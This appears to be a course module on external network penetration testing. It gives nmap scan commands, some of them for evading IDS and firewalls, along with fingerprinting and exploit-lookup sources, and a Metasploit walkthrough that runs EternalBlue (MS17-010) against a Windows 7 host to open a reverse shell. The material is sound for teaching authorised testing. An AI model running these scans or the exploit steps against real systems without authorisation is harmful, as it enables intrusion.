- [Module 05 - Network PenTest - External](#module-05---network-pentest---external)
  - [Steps](#steps)
  - [Port Scanning](#port-scanning)
    - [Discover live hosts](#discover-live-hosts)
    - [Identify Default Open Ports](#identify-default-open-ports)
    - [Use Connect Scan](#use-connect-scan)
    - [Use SYN scan](#use-syn-scan)
    - [Use Illegal Flag Combinations](#use-illegal-flag-combinations)
    - [Use ACK Flag Probe Scan](#use-ack-flag-probe-scan)
    - [UDP Scan](#udp-scan)
    - [Use Fragmentation Scan](#use-fragmentation-scan)
  - [OS and Service Fingerprinting](#os-and-service-fingerprinting)
    - [Fingerprinting the OS](#fingerprinting-the-os)
    - [Fingerprinting the Services](#fingerprinting-the-services)
  - [Vulnerability Research](#vulnerability-research)
    - [External Vulnerability Assessment](#external-vulnerability-assessment)
    - [Search and Map the Target](#search-and-map-the-target)
    - [Find Out the Security Vulnerability Exploits](#find-out-the-security-vulnerability-exploits)
  - [Exploit Verification](#exploit-verification)
    - [Run the Exploits Against Identified Vulnerabilities](#run-the-exploits-against-identified-vulnerabilities)
  - [Document the result](#document-the-result)

# Module 05 - Network PenTest - External
External network pentest has the focus on assessing the assets and identifying the vulnerabilities that could help attackers to exploit the network from outside.
## Steps
1. Information gathering (OSINT)
2. Port Scanning
3. OS and Service fingerprinting
4. Vulnerability research
5. Exploit verification
6. Reporting

## Port Scanning
Preferred tools: nmap, zenmap, hping
Process where we send a message to all the ports of a system to check whether they are open or closed.

### Discover live hosts
| Type of scan | Command |
| --- | --- |
| ICMP ping scan | nmap -sP <IP_RANGE>  |
| Popular port SYN scan | nmap -sS -P0 <IP_RANGE> |
| All ports SYN scan | nmap -sS -p- -P0 --max-rtt-timeout <time> <IP_RANGE> |
| Specific ports SYN scan | nmap -sS -p80,443 -P0 <IP_RANGE> |

### Identify Default Open Ports
| Type of scan | Command |
| --- | --- |
| Default open ports scan | nmap -p- -T4 -A -v <IP_ADDRESS> |

### Use Connect Scan
Disadvantages:
- doesn’t send RAW packets (like SYN scan does)
- every connect() request creates a log entry in the machine that leads to detection

| Type of scan | Command |
| --- | --- |
| TCP Scan | nmap -sT -v <IP_ADDRESS> |

### Use SYN scan
Helps discover the state of ports: open, closed or filtered. ICMP type 3 and code 1, 2, 3, 9, 10 or 13 define the filtering state of a target.

| Type of scan | Command |
| --- | --- |
| SYN Scan | nmap -sS -v <IP_ADDRESS> |

### Use Illegal Flag Combinations
Using FIN, PUSH, URG, a combination or no flags at all to scan the target. Only works on OSes compliant with RFC-793 (i.e., they do not work on Windows).

Flags: URG, ACK, PSH, RST, SYN, and FIN

| Type of scan | Command |
| --- | ---
| NULL Scan | nmap -sN -v <IP_ADDRESS> |
| FIN Scan | nmap -sF -v <IP_ADDRESS> |
| XMAS Scan | nmap -sX -v <IP_ADDRESS> ||
| Custom Flags Scan | nmap --scanflags URGACKPSHRSTSYNFIN -v <IP_ADDRESS> |
| SYN/FIN Scan | nmap -sS --scanflags SYNFIN -T4 -v <IP_ADDRESS> |
| FIN/PSH Scan | nmap -sF --scanflags PSH -T4 <IP_ADDRESS> |

### Use ACK Flag Probe Scan
Used to analyze the TTL and WINDOW field of the received RST packet header. It's only effective on OSes and platforms with BSD TCP/IP stacks.

Advantages:
- this scan evades IDSs most of the times.

Disadvantages:
- slow scan and exploits older OSs with vulnerable BSD-derived TCP/IP stacks.

**TTL-based ACK flag probe**
if the TTL of a RST packet on a port is less than 64, means the port is open.

**WINDOW-based ACK flag probe**
If the WINDOW value of a RST packet is higher than 0 for a given port, then that port is open.

**Detecting firewalls**
Sending an ACK packet with a random sequence number:
- if we don't get a response, then the port is filtered
- if we get a RST packetm the port is not filtered (no firewall present)

| Type of scan | Command |
| --- | --- |
| ACK Scan | nmap -sA -P0 <IP_ADDRESS> |

### UDP Scan
When running a UDP scan, the closed ports return an ICMP port unreachable, while the ports that didn't answer are either open or filtered.

| Type of Scan | Command |
| --- | --- |
| UDP Scan | nmap -sU -v <IP_ADDRESS> |

### Use Fragmentation Scan
Used to try to get through IDS and firewalls.

| Type of Scan | Command |
| --- | --- |
| Fragmentation Scan | nmap -sS -A -f <IP_ADDRESS> |

## OS and Service Fingerprinting
Preferred tools: nmap, netcraft.com
Fingerprinting is about the process of detecting the OS and services running on a device.

### Fingerprinting the OS
**Active OS fingerprinting**
| Type of Scan | Command |
| --- | --- |
| Active OS Scan | nmap -O -F <IP_ADDRESS> |

**Passive OS fingerprinting**
Use `netcraft` to gather passive OS fingerprinting from a target using [https://sitereport.netcraft.com/?url=THE_URL](https://sitereport.netcraft.com/?url=https://easydevmixin.com)

### Fingerprinting the Services
Preferred tools: nmap
Fingerprinting the services allows you to identify potential vulnerabilities of various port and their versions in a host.

| Type of Scan | Command |
| --- | --- |
| Identify Running Services | nmap -sV -T4 -F <IP_ADDRESS> |

**Fingerprinting unknown services**
When `nmap` finds services that do not match its DB, we must use advanced flags:
- -sV (version detection) or -A (aggressive, version detection + Version detection, Script Scanning and traceroot)
- --allports (don't exclude any port from version detection)
- --version-\[light|all|trace|intensity\] (version intensity of \[2|9|print extensive debugging info|a value between 0-9\])

**Tools to grab banners from services**
- [`httprint`](https://net-square.com/httprint.html), identifies web servers
- [`ID Serve`](https://www.grc.com/id/idserve.htm), web server fingerprintingm cookie values and reverse DNS information

## Vulnerability Research
Finding vulnerabilities on network components found in the previous processes.

### External Vulnerability Assessment
Identifying vulnerabilities in externally accessible devices, OSs and applications.

### Search and Map the Target
Tools used to map a service version with the associated vulnerabilities:
- Regular Google search, just search for "\<service\> \[\<version\>\] vulnerabilities"
- [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
- [National Vulnerability Database](https://nvd.nist.gov/)
- [Exploit Database](https://www.exploit-db.com/)
- [CVE details](https://www.cvedetails.com/)

### Find Out the Security Vulnerability Exploits
Finding exploits:
- [Exploit Database](https://www.exploit-db.com/)
- [Searchsploit](https://www.exploit-db.com/searchsploit), commad-line utility

## Exploit Verification
1. Find exploits for different network vulnerabilities.
2. Check the exploits, you're responsible for anything that gets executed. Know what the exploit does.
3. Run the exploit.

### Run the Exploits Against Identified Vulnerabilities
Preferred tools: Metasploit, scripts

**Example: Exploiting SMB vulnerability in Windows 7 Ultimate**
1. Run `nmap` and identify open ports: `nmap -T4 -A -sV <IP_ADDRESS>`
2. If port 445 is open (*it shouldn't, that's a finding to report!*) obtain more information: `nmap --script=smb-os-discovery -p 445 <IP_ADDRESS>`
3. Start Metasploit: `msfconsole`
4. In Metasploit run the command: `use auxiliary/scanner/smb/smb_ms17_010`
5. Set the remote host: `set RHOSTS <IP_ADDRESS>`
6. Execute the scan and study the results: `run`
7. If the scan result is that the host is vulnerable search for an exploit (in Metasploit or do a Google search, pretend we found `ms17_010_eternalblue`).
8. In Metasploit run the command: `use exploit/windows/smb/ms17_010_eternalblue`
9. Set the remote host: `set RHOSTS <IP_ADDRESS>`
10. Execute the exploit: `exploit`, if it works, we'll have a reverse shell to the host.

## Document the result
- The list of ports, OS, services and their versions.
- Ports and services through which exploitation could be possible.
